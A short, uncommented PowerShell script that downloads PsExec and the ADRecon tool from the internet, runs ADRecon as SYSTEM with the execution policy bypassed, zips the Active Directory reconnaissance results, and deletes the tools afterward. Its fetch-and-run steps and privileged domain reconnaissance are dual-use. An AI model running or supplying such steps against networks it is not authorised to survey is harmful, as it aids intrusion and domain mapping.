New-Item -Path "c:\" -Name test -ItemType "directory"
Set-Location -Path c:\test
Invoke-WebRequest -Uri 'https://live.sysinternals.com/PsExec64.exe' -OutFile 'C:\test\Psexec.exe'
Start-Sleep -s 5
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/awsmhacks/ADRecon/master/ADRecon.ps1' -OutFile 'C:\test\AdRecon.ps1'
Start-Sleep -s 5
Start-Process -FilePath "c:\test\Psexec.exe" -ArgumentList "/accepteula -s powershell.exe -executionpolicy bypass -noninteractive -nologo -file c:\test\AdRecon.ps1"
Start-Sleep -s 30
Start-Sleep -s 30
Start-Sleep -s 30
Start-Sleep -s 30
Start-Sleep -s 30
Start-Sleep -s 30
Compress-Archive -Path "C:\test\CSV-Files\*.csv" -DestinationPath "c:\test\report.zip"
Start-Sleep -s 30

Remove-Item -Path "c:\test\CSV-Files\" -Force -Recurse
Remove-Item -Path "c:\test\Psexec.exe" -Force
Remove-Item -Path "c:\test\ADRecon.ps1"
